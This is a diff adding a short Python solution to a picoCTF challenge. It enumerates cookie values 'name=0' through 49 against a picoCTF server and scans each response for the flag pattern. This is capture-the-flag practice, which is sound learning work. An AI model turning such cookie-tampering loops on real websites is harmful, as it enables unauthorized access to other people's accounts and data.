@@ -1,0 +1,36 @@
+import requests
+import re
+
+link = "http://mercury.picoctf.net:29649/check"
+def main():
+    i = 0
+    #I use a while loop so I can go backwards on iterations incase it errors out
+    while i < 50:
+        cookie = 'name={}'.format(i)
+        headers = {'Cookie':cookie}
+        
+        try:
+            response = requests.get(link, headers=headers)
+            responseAsHtmlRaw = response.text
+            print(f"Attempting attack w/ cookie = {i}")
+            
+            #Pan html response for anything that looks flag
+            #https://www.w3schools.com/python/python_regex.asp
+            flagFound = re.search(r'picoCTF\{.*?\}', responseAsHtmlRaw)
+            
+            if flagFound:
+                print(f"SUCCESS. FLAG: {flagFound.group(0)}")
+                #End if flag was found
+                break 
+            else:
+                print("Failure :(")
+            #Iterate if flag wasn't found
+            i += 1
+        
+        #Account for getting randomly booted
+        except requests.exceptions.ConnectionError as e:
+            print(f"Connection err at iteration {i}: {e}")
+
+if __name__ == "__main__":
+    main()
+    
